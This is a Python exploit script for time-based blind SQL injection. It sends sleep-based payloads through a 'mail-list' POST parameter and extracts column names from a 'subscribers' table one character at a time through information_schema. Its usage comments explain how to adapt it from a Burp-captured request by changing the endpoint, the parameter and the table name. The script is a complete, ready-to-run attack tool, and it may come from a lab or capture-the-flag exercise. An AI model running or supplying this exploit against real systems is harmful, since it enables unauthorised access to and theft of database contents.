import requests
import sys
import time


# ---------------------------------------------------------------
#   How to use:
#   Capture a vulnerable POST request in Burp
#   Change the endpoint to wherever the SQLi is ie. /index.php
#   Use the data being sent in the 'data' dictionary below and make sure the vulnerable parameter has the payload f string
#   Change the table_name in brute_db function
# ---------------------------------------------------------------


# Send the payload to the vulnerable parameter on the target host
# If it takes 5 seconds or longer to get a reply, return True
def send_payload(ip, payload):
    url = f"http://{ip}/index.php"  # -----  CHANGE THIS ENDPOINT -----
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'mail-list': f"tom' OR IF({payload}, sleep(5), 'NO') AND '1'='1"  # ---- CHANGE THIS PARAMETER AND/OR ADD ANYMORE PARAMETERS -------
    }
    start = time.time()
    r = requests.post(url, headers=headers, data=data)
    end = time.time()
    if end - start >= 5:
        return True
    else:
        return False


# Brute-force the length of the columns
# Iterate to all possible letters and brute-force the name of the columns
def brute_db(ip):
    length = 0
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        if send_payload(ip, f"LENGTH((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers'))={i}"):  # -----  CHANGE table_name -----
            length = i
            break
    print(f"Length: {length}")
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()
    db_name = ""
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            if send_payload(ip, f"SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers'),{i},1)='{chr(j)}'"):   # -----  CHANGE table_name -----
                db_name += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
                break  # Move to the next character position once a match is found
    sys.stdout.write("\n")
    sys.stdout.flush()
    return db_name


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <ip>")
        sys.exit(1)
    ip = sys.argv[1]
    test = brute_db(ip)
    print(f"Column names: {test}")


if __name__ == "__main__":
    main()
